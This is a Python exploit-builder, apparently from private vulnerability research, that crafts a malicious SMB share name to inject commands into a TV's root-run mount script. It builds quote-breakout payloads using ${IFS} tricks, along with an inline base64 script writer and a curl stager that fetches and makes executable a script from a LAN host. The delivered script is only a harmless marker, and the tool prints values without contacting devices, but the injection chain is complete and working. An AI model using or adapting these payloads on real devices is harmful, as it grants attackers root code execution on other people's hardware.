#!/usr/bin/env python3
"""Private, non-tracked research tool: deliver a script through `smbpath=`.

Assessed source-to-sink on GQ55Q60TGUXZG / T-NKLDEUC-2743.0:

    remotepc_uilauncher writes a temp credential file with raw lines:
        username=<input>
        password=<input>
        smbpath="<selected SMB share name>"
    mount.smb.sh reads that file, substitutes the `smbpath=` value for the
    literal `[:SMBPATH:]` template in the mount argument, and finally runs:
        [[ "$debug" == "false" ]] && /bin/bash -c "$UTIL $UTIL_OPT"
    as root. The share name is attacker-controlled through NetrShareEnum, so a
    quote-breakout in the share name reaches the same root `bash -c` sink that
    the password field already proved.

Unlike `password=`, the launcher wraps the share name in double quotes
(`smbpath="` appears as a literal in the launcher), so the injection value must
first close that quote. The `#` terminator comments out the mountpoint copy of
the template so the command runs exactly once.

This module is deliberately marionette-only: it builds values and never talks
to a device. See GUARDRAILS.md before any live use.
"""

from __future__ import annotations

import argparse
import base64
import hashlib
import json
import re
import secrets
from dataclasses import asdict, dataclass

# Assessed sink pin (must match research/remotepc-cifs-root/host/remotepc/model.py).
MOUNT_SMB_SHA256 = "37aaf2f05bf714332a6bf8f14b543ac9584a1b9a051341674a74fc0dd753c57e"

TOKEN_RE = re.compile(r"[0-9a-f]{16}")
DEFAULT_SCRIPT_DIR = "/home/owner/share/tmp/sdk_tools"
DEFAULT_HOST_HTTP_PORT = 18080

# The upper bound observed in the NetrShareEnum response (NET_SHARE_NETNAME).
# The crafted value only needs the breakout + a compact command.
NETNAME_BUDGET = 256


@dataclass(frozen=True)
class Delivery:
    token: str
    script_path: str
    script_content: str
    script_sha256: str
    command: str
    netname: str
    credential_file: str
    mount_argument: str

    def as_dict(self) -> dict[str, str]:
        return asdict(self)


def b64(data: bytes) -> str:
    return base64.b64encode(data).decode("ascii")


def sha256_text(text: str) -> str:
    return hashlib.sha256(text.encode("utf-8")).hexdigest()


def fresh_token(token_factory=secrets.token_hex) -> str:
    value = token_factory(8)
    if not TOKEN_RE.fullmatch(value):
        raise ValueError("token source returned a non-hex value")
    return value


def _ifs(parts: list[str]) -> str:
    """Join command words with ${IFS} so the value needs no literal spaces."""
    return "${IFS}".join(parts)


def build_inline_command(
    script_path: str,
    script_content: str,
    *,
    root: str = "",
    bin_prefix: str = "/usr/bin/",
) -> str:
    """A no-space, base64 script writer that fits the netname budget."""
    encoded = b64(script_content.encode("utf-8"))
    real_path = root + script_path
    return (
        _ifs(["printf", "%s", encoded])
        + f"|{bin_prefix}base64" + "${IFS}-d>" + real_path
        + f"&&{bin_prefix}chmod" + "${IFS}755" + "${IFS}" + real_path
        + f"&&{bin_prefix}sync"
    )


def build_fetch_command(
    script_path: str,
    *,
    host_ip: str,
    port: int = DEFAULT_HOST_HTTP_PORT,
    root: str = "",
    bin_prefix: str = "/usr/bin/",
) -> str:
    """A short stager that pulls an arbitrary-size script over the LAN."""
    real_path = root + script_path
    url = f"http://{host_ip}:{port}/deliver.sh"
    return (
        f"{bin_prefix}curl" + "${IFS}-fsS" + "${IFS}-o" + "${IFS}" + real_path
        + "${IFS}" + url
        + f"&&{bin_prefix}chmod" + "${IFS}755" + "${IFS}" + real_path
        + f"&&{bin_prefix}sync"
    )


def craft_netname(base: str, command: str, *, form: str) -> str:
    """Wrap the command in the share name so it survives the credential write.

    form="adaptive": the value carries its own quote. This parses correctly
        whether the launcher writes smbpath="<value>" or smbpath=<value>:
          quoted:   //H/"x";CMD;#" ...   -> quoted x, then CMD, then comment
          unquoted: //H/x";CMD;# ...     -> the first quote absorbs the middle,
                                           then ;CMD;# runs once
    form="quoted": alias of adaptive (kept for explicitness).
    form="unquoted": no breakout quote, only correct if the write is unquoted.
    """
    if form in {"adaptive", "quoted"}:
        return f'{base}";{command};#'
    if form == "unquoted":
        return f"{base};{command};#"
    raise ValueError("unknown write form")


def build_mount_argument(
    *,
    host_ip: str,
    credential_file: str,
    share_placeholder: str = "[:SMBPATH:]",
) -> str:
    """Reproduces the argument the launcher hands to the privileged service."""
    return (
        "-o ro,nosuid,noexec,nodev,credentials=" + credential_file
        + ",vers=2.1 //" + host_ip + "/" + share_placeholder
        + " /opt/usr/home/owner/content/smb/" + share_placeholder
    )


def render_credential_file(
    username: str,
    password: str,
    netname: str,
    *,
    form: str,
) -> str:
    value = f'"{netname}"' if form == "quoted" else netname
    return f"username={username}\npassword={password}\nsmbpath={value}\n"


def compose_script(token: str, *, root: str = "", marker_dir: str = DEFAULT_SCRIPT_DIR) -> str:
    return (
        "#!/bin/sh\n"
        "# Private smbpath= delivery proof. Inert marker only.\n"
        f"id > {root}{marker_dir}/sp-{token}.out\n"
        f"echo smbpath-script-{token} > {root}{marker_dir}/sp-{token}.stamp\n"
    )


def build_delivery(
    *,
    token: str,
    host_ip: str,
    username: str,
    password: str,
    form: str,
    mode: str,
    script_dir: str = DEFAULT_SCRIPT_DIR,
    root: str = "",
    http_port: int = DEFAULT_HOST_HTTP_PORT,
    bin_prefix: str = "/usr/bin/",
) -> Delivery:
    script_path = f"{script_dir}/sp-{token}.sh"
    script_content = compose_script(token, root=root, marker_dir=script_dir)
    if mode == "inline":
        command = build_inline_command(
            script_path, script_content, root=root, bin_prefix=bin_prefix
        )
    elif mode == "fetch":
        command = build_fetch_command(
            script_path,
            host_ip=host_ip,
            port=http_port,
            root=root,
            bin_prefix=bin_prefix,
        )
    else:
        raise ValueError("mode must be inline or fetch")
    netname = craft_netname("x", command, form=form)
    credential_file = f"/tmp/rpc-sp-{token}"
    return Delivery(
        token=token,
        script_path=script_path,
        script_content=script_content,
        script_sha256=sha256_text(script_content),
        command=command,
        netname=netname,
        credential_file=credential_file,
        mount_argument=build_mount_argument(
            host_ip=host_ip, credential_file=credential_file
        ),
    )


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--host-ip", required=True, help="lab host LAN address")
    parser.add_argument("--username", default="q60t")
    parser.add_argument("--password", default="lab-password", help="benign SMB password")
    parser.add_argument(
        "--form", choices=("adaptive", "quoted", "unquoted"), default="adaptive"
    )
    parser.add_argument("--mode", choices=("inline", "fetch"), default="inline")
    parser.add_argument("--http-port", type=int, default=DEFAULT_HOST_HTTP_PORT)
    parser.add_argument("--script-dir", default=DEFAULT_SCRIPT_DIR)
    parser.add_argument(
        "--root",
        default="",
        help="offline prefix mirroring the TV root; empty for a real target",
    )
    parser.add_argument(
        "--bin-prefix",
        default="/usr/bin/",
        help="utility directory; use '' to rely on PATH in a local sandbox",
    )
    parser.add_argument("--token", default=None)
    args = parser.parse_args()

    token = args.token or fresh_token()
    if not TOKEN_RE.fullmatch(token):
        parser.error("token must be 16 lowercase hex characters")
    delivery = build_delivery(
        token=token,
        host_ip=args.host_ip,
        username=args.username,
        password=args.password,
        form=args.form,
        mode=args.mode,
        script_dir=args.script_dir,
        root=args.root,
        http_port=args.http_port,
        bin_prefix=args.bin_prefix,
    )
    length = len(delivery.netname)
    document = {
        "form": args.form,
        "mode": args.mode,
        "netname_length": length,
        "netname_budget": NETNAME_BUDGET,
        "over_budget": length > NETNAME_BUDGET,
        "delivery": delivery.as_dict(),
    }
    print(json.dumps(document, indent=2, sort_keys=True))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
